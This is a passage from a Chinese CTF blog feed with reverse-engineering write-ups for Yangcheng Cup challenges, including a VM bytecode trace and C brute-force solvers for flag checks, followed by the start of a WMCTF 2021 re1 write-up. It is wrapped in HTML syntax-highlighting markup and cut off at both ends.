class="hljs-number">23</span>, <span class="hljs-number">0</span>x<span class="hljs-number">10</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">21</span>, <span class="hljs-number">0</span>x<span class="hljs-number">80</span>, <span class="hljs-number">0</span>x<span class="hljs-number">02</span>, <span class="hljs-number">0</span>x<span class="hljs-number">10</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">23</span>, <span class="hljs-number">0</span>xF<span class="hljs-number">7</span>,<br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">22</span>, <span class="hljs-number">0</span>x<span class="hljs-number">80</span>, <span class="hljs-number">0</span>x<span class="hljs-number">02</span>, <span class="hljs-number">0</span>x<span class="hljs-number">08</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">23</span>, <span class="hljs-number">0</span>xF<span class="hljs-number">7</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">23</span>, <br><span class="hljs-attribute">0xF7</span>, <br><span class="hljs-attribute">0xFE</span>, <br><span class="hljs-attribute">0x80</span>, <span class="hljs-number">0</span>x<span class="hljs-number">02</span>, <span class="hljs-number">0</span>x<span class="hljs-number">05</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0x22</span>, <br><span class="hljs-attribute">0x77</span>, <br><span class="hljs-attribute">0x10</span>, <br><span class="hljs-attribute">0x80</span>, <span class="hljs-number">0</span>x<span class="hljs-number">02</span>, <span class="hljs-number">0</span>x<span class="hljs-number">07</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0x23</span>, <br><span class="hljs-attribute">0x80</span>, <span class="hljs-number">0</span>x<span class="hljs-number">02</span>, <span class="hljs-number">0</span>x<span class="hljs-number">23</span>, <span class="hljs-number">0</span>x<span class="hljs-number">77</span>, <span class="hljs-number">0</span>xF<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">98</span>, <br><span class="hljs-attribute">0x31</span>, a[<span class="hljs-number">1</span>] &amp;= a[<span class="hljs-number">2</span>]<br><span class="hljs-attribute">0x77</span>, <br><span class="hljs-attribute">0x10</span>, <br><span class="hljs-attribute">0x80</span>, <span class="hljs-number">0</span>x<span class="hljs-number">02</span>, <span class="hljs-number">0</span>x<span class="hljs-number">18</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>,<br><span class="hljs-attribute">0x23</span>, <br><span class="hljs-attribute">0x80</span>, <span class="hljs-number">0</span>x<span class="hljs-number">02</span>, <span class="hljs-number">0</span>x<span class="hljs-number">20</span>, <span class="hljs-number">0</span>xB<span class="hljs-number">9</span>, <span class="hljs-number">0</span>xE<span class="hljs-number">4</span>, <span class="hljs-number">0</span>x<span class="hljs-number">35</span>, <br><span class="hljs-attribute">0x31</span>, <br><span class="hljs-attribute">0x77</span>, <br><span class="hljs-attribute">0x10</span>, <br><span class="hljs-attribute">0x80</span>, <span class="hljs-number">0</span>x<span class="hljs-number">02</span>, <span class="hljs-number">0</span>x<span class="hljs-number">12</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0x22</span>, <br><span class="hljs-attribute">0x77</span>, <br><span class="hljs-attribute">0xA0</span>, <span class="hljs-number">0</span>x<span class="hljs-number">6</span>FEBF<span class="hljs-number">967</span><br><br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">24</span>, <span class="hljs-number">0</span>x<span class="hljs-number">80</span>, <span class="hljs-number">0</span>x<span class="hljs-number">02</span>, <span class="hljs-number">0</span>x<span class="hljs-number">18</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">23</span>, <span class="hljs-number">0</span>x<span class="hljs-number">10</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">25</span>, <span class="hljs-number">0</span>x<span class="hljs-number">80</span>, <span class="hljs-number">0</span>x<span class="hljs-number">02</span>, <span class="hljs-number">0</span>x<span class="hljs-number">10</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">23</span>, <span class="hljs-number">0</span>xF<span class="hljs-number">7</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">26</span>, <span class="hljs-number">0</span>x<span class="hljs-number">80</span>, <span class="hljs-number">0</span>x<span class="hljs-number">02</span>, <span class="hljs-number">0</span>x<span class="hljs-number">08</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">23</span>, <span class="hljs-number">0</span>xF<span class="hljs-number">7</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">27</span>, <br><span class="hljs-attribute">0xF7</span>, a[<span class="hljs-number">9</span>] += a[<span class="hljs-number">1</span>]<br><span class="hljs-attribute">0xFE</span>, a[<span class="hljs-number">1</span>] = a[<span class="hljs-number">9</span>]<br><span class="hljs-attribute">0x32</span>, <span class="hljs-number">0</span>x<span class="hljs-number">20</span>, a[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>x<span class="hljs-number">20</span><br><span class="hljs-attribute">0x43</span>, a[<span class="hljs-number">1</span>] *= a[<span class="hljs-number">3</span>]<br><span class="hljs-attribute">0x33</span>, a[<span class="hljs-number">4</span>] = a[<span class="hljs-number">1</span>]<br><span class="hljs-attribute">0x77</span>, a[<span class="hljs-number">1</span>] ^= a[<span class="hljs-number">9</span>]<br><span class="hljs-attribute">0x80</span>, <span class="hljs-number">0</span>x<span class="hljs-number">02</span>, <span class="hljs-number">0</span>x<span class="hljs-number">11</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, a[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>x<span class="hljs-number">11</span><br><span class="hljs-attribute">0x22</span>,  a[<span class="hljs-number">1</span>] &gt;&gt;= a[<span class="hljs-number">2</span>]<br><span class="hljs-attribute">0x35</span>,  a[<span class="hljs-number">5</span>] = a[<span class="hljs-number">1</span>]<br><span class="hljs-attribute">0x37</span>,  a[<span class="hljs-number">1</span>] = a[<span class="hljs-number">5</span>]<br><span class="hljs-attribute">0x38</span>,  a[<span class="hljs-number">1</span>] ^= a[<span class="hljs-number">4</span>]<br><span class="hljs-attribute">0x77</span>,  a[<span class="hljs-number">1</span>] ^= a[<span class="hljs-number">9</span>]<br><span class="hljs-attribute">0x80</span>, <span class="hljs-number">0</span>x<span class="hljs-number">02</span>, <span class="hljs-number">0</span>x<span class="hljs-number">0</span>D, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, a[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>xD<br><span class="hljs-attribute">0x23</span>, a[<span class="hljs-number">1</span>] &lt;&lt;= <span class="hljs-number">0</span>xD<br><span class="hljs-attribute">0x77</span>, a[<span class="hljs-number">1</span>] ^= a[<span class="hljs-number">9</span>]<br><span class="hljs-attribute">0x38</span>, a[<span class="hljs-number">1</span>] ^= a[<span class="hljs-number">4</span>]<br><span class="hljs-attribute">0x39</span>, a[<span class="hljs-number">1</span>] ^= a[<span class="hljs-number">5</span>]<br><span class="hljs-attribute">0x10</span>, a[<span class="hljs-number">9</span>] = a[<span class="hljs-number">1</span>]<br><span class="hljs-attribute">0x32</span>, <span class="hljs-number">0</span>x<span class="hljs-number">20</span>, a[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>x<span class="hljs-number">20</span><br><span class="hljs-attribute">0x43</span>, a[<span class="hljs-number">1</span>] *= a[<span class="hljs-number">3</span>]<br><span class="hljs-attribute">0x33</span>, a[<span class="hljs-number">4</span>] = a[<span class="hljs-number">1</span>]<br><span class="hljs-attribute">0x77</span>, a[<span class="hljs-number">1</span>] ^= a[<span class="hljs-number">9</span>]<br><span class="hljs-attribute">0x80</span>, <span class="hljs-number">0</span>x<span class="hljs-number">02</span>, <span class="hljs-number">0</span>x<span class="hljs-number">11</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, a[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>x<span class="hljs-number">11</span><br><span class="hljs-attribute">0x22</span>, a[<span class="hljs-number">1</span>] &gt;&gt;= a[<span class="hljs-number">2</span>]<br><span class="hljs-attribute">0x35</span>, a[<span class="hljs-number">5</span>] = a[<span class="hljs-number">1</span>]<br><span class="hljs-attribute">0x37</span>, a[<span class="hljs-number">1</span>] = a[<span class="hljs-number">5</span>]<br><span class="hljs-attribute">0x38</span>, a[<span class="hljs-number">1</span>] ^= a[<span class="hljs-number">4</span>]<br><span class="hljs-attribute">0x77</span>, a[<span class="hljs-number">1</span>] ^= a[<span class="hljs-number">9</span>]<br><span class="hljs-attribute">0x80</span>, <span class="hljs-number">0</span>x<span class="hljs-number">02</span>, <span class="hljs-number">0</span>x<span class="hljs-number">0</span>D, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, a[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>xD<br><span class="hljs-attribute">0x23</span>, a[<span class="hljs-number">1</span>] &lt;&lt;= <span class="hljs-number">0</span>xD<br><span class="hljs-attribute">0x77</span>, a[<span class="hljs-number">1</span>] ^= a[<span class="hljs-number">9</span>]<br><span class="hljs-attribute">0x38</span>, a[<span class="hljs-number">1</span>] ^= a[<span class="hljs-number">4</span>]<br><span class="hljs-attribute">0x39</span>, a[<span class="hljs-number">1</span>] ^= a[<span class="hljs-number">5</span>]<br><span class="hljs-attribute">0xC7</span>, a<span class="hljs-number">1</span> = <span class="hljs-number">0</span>xCF<span class="hljs-number">1304</span>DC<br><br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">28</span>, <span class="hljs-number">0</span>x<span class="hljs-number">80</span>, <span class="hljs-number">0</span>x<span class="hljs-number">02</span>, <span class="hljs-number">0</span>x<span class="hljs-number">18</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">23</span>, <span class="hljs-number">0</span>x<span class="hljs-number">10</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">29</span>, <span class="hljs-number">0</span>x<span class="hljs-number">80</span>, <span class="hljs-number">0</span>x<span class="hljs-number">02</span>, <span class="hljs-number">0</span>x<span class="hljs-number">10</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">23</span>, <span class="hljs-number">0</span>xF<span class="hljs-number">7</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">2</span>A, <span class="hljs-number">0</span>x<span class="hljs-number">80</span>, <span class="hljs-number">0</span>x<span class="hljs-number">02</span>, <span class="hljs-number">0</span>x<span class="hljs-number">08</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">23</span>, <span class="hljs-number">0</span>xF<span class="hljs-number">7</span>, <br><span class="hljs-attribute">0xC1</span>, <span class="hljs-number">0</span>x<span class="hljs-number">2</span>B, <br><span class="hljs-attribute">0xF7</span>, <br><span class="hljs-attribute">0xFE</span>, <br><span class="hljs-attribute">0x32</span>, <br><span class="hljs-attribute">0x20</span>, <br><span class="hljs-attribute">0x43</span>, <br><span class="hljs-attribute">0x33</span>, <br><span class="hljs-attribute">0x77</span>, <br><span class="hljs-attribute">0x80</span>, <span class="hljs-number">0</span>x<span class="hljs-number">02</span>, <span class="hljs-number">0</span>x<span class="hljs-number">11</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0x22</span>, <br><span class="hljs-attribute">0x35</span>, <br><span class="hljs-attribute">0x37</span>, <br><span class="hljs-attribute">0x38</span>, <br><span class="hljs-attribute">0x77</span>, <br><span class="hljs-attribute">0x80</span>, <span class="hljs-number">0</span>x<span class="hljs-number">02</span>, <span class="hljs-number">0</span>x<span class="hljs-number">0</span>D, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0x23</span>, <br><span class="hljs-attribute">0x77</span>, <br><span class="hljs-attribute">0x38</span>, <br><span class="hljs-attribute">0x39</span>, <br><span class="hljs-attribute">0x10</span>, <br><span class="hljs-attribute">0x32</span>, <span class="hljs-number">0</span>x<span class="hljs-number">20</span>, <br><span class="hljs-attribute">0x43</span>, <br><span class="hljs-attribute">0x33</span>, <br><span class="hljs-attribute">0x77</span>, <br><span class="hljs-attribute">0x80</span>, <span class="hljs-number">0</span>x<span class="hljs-number">02</span>, <span class="hljs-number">0</span>x<span class="hljs-number">11</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0x22</span>, <br><span class="hljs-attribute">0x35</span>, <br><span class="hljs-attribute">0x37</span>, <br><span class="hljs-attribute">0x38</span>, <br><span class="hljs-attribute">0x77</span>, <br><span class="hljs-attribute">0x80</span>, <span class="hljs-number">0</span>x<span class="hljs-number">02</span>, <span class="hljs-number">0</span>x<span class="hljs-number">0</span>D, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <span class="hljs-number">0</span>x<span class="hljs-number">00</span>, <br><span class="hljs-attribute">0x23</span>, <br><span class="hljs-attribute">0x77</span>, <br><span class="hljs-attribute">0x38</span>, <br><span class="hljs-attribute">0x39</span>, <br><span class="hljs-attribute">0xC8</span>,  <span class="hljs-number">0</span>x<span class="hljs-number">283</span>B<span class="hljs-number">8</span>E<span class="hljs-number">84</span><br><span class="hljs-attribute">0x99</span><br></code></pre></td></tr></table></figure><p>前32个就是异或，后边分析出来是加减乘异或移位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;stdio.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">u_int32_t</span> a[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i&lt; <span class="hljs-number">0xffffffff</span>;i++)&#123;<br>        a[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>        a[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>        a[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;<br>        a[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;<br>        a[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>;<br>        a[<span class="hljs-number">9</span>] = <span class="hljs-number">0</span>;<br>        a[<span class="hljs-number">1</span>] = i;<br>        a[<span class="hljs-number">9</span>] = a[<span class="hljs-number">1</span>];<br>        a[<span class="hljs-number">1</span>] = a[<span class="hljs-number">9</span>];<br>        a[<span class="hljs-number">3</span>] = <span class="hljs-number">0x20</span>;<br>        a[<span class="hljs-number">1</span>] = (a[<span class="hljs-number">1</span>] * a[<span class="hljs-number">3</span>]);<br>        a[<span class="hljs-number">4</span>] = a[<span class="hljs-number">1</span>];<br>        a[<span class="hljs-number">1</span>] ^= a[<span class="hljs-number">9</span>];<br>        a[<span class="hljs-number">2</span>] = <span class="hljs-number">0x11</span>;<br>        a[<span class="hljs-number">1</span>] &gt;&gt;= a[<span class="hljs-number">2</span>];<br>        a[<span class="hljs-number">5</span>] = a[<span class="hljs-number">1</span>];<br>        a[<span class="hljs-number">1</span>] = a[<span class="hljs-number">5</span>];<br>        a[<span class="hljs-number">1</span>] ^= a[<span class="hljs-number">4</span>];<br>        a[<span class="hljs-number">1</span>] ^= a[<span class="hljs-number">9</span>];<br>        a[<span class="hljs-number">2</span>] = <span class="hljs-number">0xD</span>;<br>        a[<span class="hljs-number">1</span>] = (a[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">0xD</span>);<br>        a[<span class="hljs-number">1</span>] ^= a[<span class="hljs-number">9</span>];<br>        a[<span class="hljs-number">1</span>] ^= a[<span class="hljs-number">4</span>];<br>        a[<span class="hljs-number">1</span>] ^= a[<span class="hljs-number">5</span>];<br>        a[<span class="hljs-number">9</span>] = a[<span class="hljs-number">1</span>];<br>        a[<span class="hljs-number">3</span>] = <span class="hljs-number">0x20</span>;<br>        a[<span class="hljs-number">1</span>] = (a[<span class="hljs-number">1</span>] * a[<span class="hljs-number">3</span>]);<br>        a[<span class="hljs-number">4</span>] = a[<span class="hljs-number">1</span>];<br>        a[<span class="hljs-number">1</span>] ^= a[<span class="hljs-number">9</span>];<br>        a[<span class="hljs-number">2</span>] = <span class="hljs-number">0x11</span>;<br>        a[<span class="hljs-number">1</span>] &gt;&gt;= a[<span class="hljs-number">2</span>];<br>        a[<span class="hljs-number">5</span>] = a[<span class="hljs-number">1</span>];<br>        a[<span class="hljs-number">1</span>] = a[<span class="hljs-number">5</span>];<br>        a[<span class="hljs-number">1</span>] ^= a[<span class="hljs-number">4</span>];<br>        a[<span class="hljs-number">1</span>] ^= a[<span class="hljs-number">9</span>];<br>        a[<span class="hljs-number">2</span>] = <span class="hljs-number">0xD</span>;<br>        a[<span class="hljs-number">1</span>] = (a[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">0xD</span>);<br>        a[<span class="hljs-number">1</span>] ^= a[<span class="hljs-number">9</span>];<br>        a[<span class="hljs-number">1</span>] ^= a[<span class="hljs-number">4</span>];<br>        a[<span class="hljs-number">1</span>] ^= a[<span class="hljs-number">5</span>];<br>        <span class="hljs-keyword">if</span>(a[<span class="hljs-number">1</span>] == <span class="hljs-number">0x283B8E84</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, i);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="deltx"><a href="#deltx" class="headerlink" title="deltx"></a>deltx</h1><p><img src="/2021/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF%E9%80%86%E5%90%91%E9%83%A8%E5%88%86wp/image-20210914111059300.png" alt="image-20210914111059300"></p><p>第一个check，直接拿去爆破。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;stdio.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">int</span> v9;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v48; <span class="hljs-comment">// er9</span><br>    <span class="hljs-keyword">int</span> v49; <span class="hljs-comment">// esi</span><br>    <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// er14</span><br>    <span class="hljs-keyword">int</span> v51; <span class="hljs-comment">// er10</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v52; <span class="hljs-comment">// er11</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v53; <span class="hljs-comment">// edx</span><br>    <span class="hljs-keyword">int</span> v54; <span class="hljs-comment">// ecx</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v55; <span class="hljs-comment">// er8</span><br>    <span class="hljs-keyword">char</span> v56; <span class="hljs-comment">// al</span><br>    <span class="hljs-keyword">int</span> v57; <span class="hljs-comment">// eax</span><br>    <span class="hljs-keyword">int</span> v58; <span class="hljs-comment">// er10</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>;j &lt; <span class="hljs-number">0xffff</span>; j++)&#123;<br>        <span class="hljs-comment">//printf(&quot;%d\n&quot;, j);</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> h = <span class="hljs-number">0</span>;h &lt; <span class="hljs-number">0xffff</span>; h++)&#123;<br>            v9 = j;<br>            v49 = h;<br>            v48 = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span> ( i = v9; v49; v49 &gt;&gt;= <span class="hljs-number">1</span> )<br>            &#123;<br>                <span class="hljs-keyword">if</span> ( (v49 &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )<br>                &#123;<br>                    v51 = i;<br>                    v52 = v48;<br>                    <span class="hljs-keyword">do</span><br>                    &#123;<br>                        v48 = <span class="hljs-number">0</span>;<br>                        v53 = v51;<br>                        v54 = <span class="hljs-number">0</span>;<br>                        v55 = v52;<br>                        <span class="hljs-keyword">while</span> ( v55 || v53 )<br>                        &#123;<br>                            v56 = (<span class="hljs-keyword">char</span>)(v55 + v53);<br>                            v55 &gt;&gt;= <span class="hljs-number">1</span>;<br>                            v57 = (v56 &amp; <span class="hljs-number">1</span>) &lt;&lt; v54++;<br>                            v48 |= v57;<br>                            v53 &gt;&gt;= <span class="hljs-number">1</span>;<br>                        &#125;<br>                        v58 = (<span class="hljs-keyword">int</span>)(v52 &amp; v51);<br>                        v52 = v48;<br>                        v51 = <span class="hljs-number">2</span> * v58;<br>                    &#125;<br>                    <span class="hljs-keyword">while</span> ( v51 );<br>                &#125;<br>                i *= <span class="hljs-number">2</span>;<br>            &#125;<br>            <span class="hljs-comment">//0x249E15C5, 0x34C7EAE2, 0x637973BA, 0xE5FD104</span><br>            <span class="hljs-keyword">if</span>(v48 == <span class="hljs-number">0xE5FD104</span>)&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d  %d\n&quot;</span>, j,h);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>第二个check：</p><p><img src="/2021/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF%E9%80%86%E5%90%91%E9%83%A8%E5%88%86wp/image-20210914111306636.png" alt="image-20210914111306636"></p><p>得到的结果要注意开始会检查大小写，爆破可能有多个，通过调试过第二个check。</p>]]></content>
    
    
    <categories>
      
      <category>CTF赛题writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WMCTF-2021-re部分wp</title>
    <link href="/2021/09/03/WMCTF-2021-re%E9%83%A8%E5%88%86wp/"/>
    <url>/2021/09/03/WMCTF-2021-re%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h1><p>无法F5，栈帧太大，看了看汇编。</p><p><img src="/2021/09/03/WMCTF-2021-re%E9%83%A8%E5%88%86wp/image-20210903134108044-0647669.png" alt="image-20210903134108044"></p><p>通过alt+k调整栈帧或者把相应的汇编代码nop掉。</p><p>然后分析伪代码，输入，check长度和flag格式</p><p><img src="/2021/09/03/WMCTF-2021-re%E9%83%A8%E5%88%86wp/image-20210903143509630.png" alt="image-20210903143509630"></p><p>之后会对几个block块进行赋值：</p><p><img src="/2021/09/03/WMCTF-2021-re%E9%83%A8%E5%88%86wp/image-20210903143605191.png" alt="image-20210903143605191"></p><p><img src="/2021/09/03/WMCTF-2021-re%E9%83%A8%E5%88%86wp/image-20210903143645703.png" alt="image-20210903143645703"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">block</span>块：<br><span class="hljs-attribute">0</span>-<span class="hljs-number">0</span>xff flag&#123;xxxx&#125; 中的第一个x 取余 <span class="hljs-number">256</span><br><span class="hljs-attribute">0x101</span>-<span class="hljs-number">0</span>x<span class="hljs-number">200</span> flag&#123;xxxx&#125; 中的第二个x 加<span class="hljs-number">1</span> 取余 <span class="hljs-number">256</span><br><span class="hljs-attribute">0x201</span>-<span class="hljs-number">0</span>x<span class="hljs-number">20</span>f flag&#123;xxxx&#125; 中的第三个x 加<span class="hljs-number">2</span> 取余 <span class="hljs-number">256</span><br><span class="hljs-attribute">0x210</span> <span class="hljs-number">0</span>x<span class="hljs-number">10</span><br><span class="hljs-attribute">0x212</span>-<span class="hljs-number">0</span>x<span class="hljs-number">221</span> flag&#123;xxxx yyyyyyyyyyyyyyyy &#125; 存储<span class="hljs-number">16</span>个y<br><span class="hljs-attribute">0x222</span> <span class="hljs-number">0</span>xdead<br><span class="hljs-attribute">0x224</span>-<span class="hljs-number">0</span>x<span class="hljs-number">240</span> 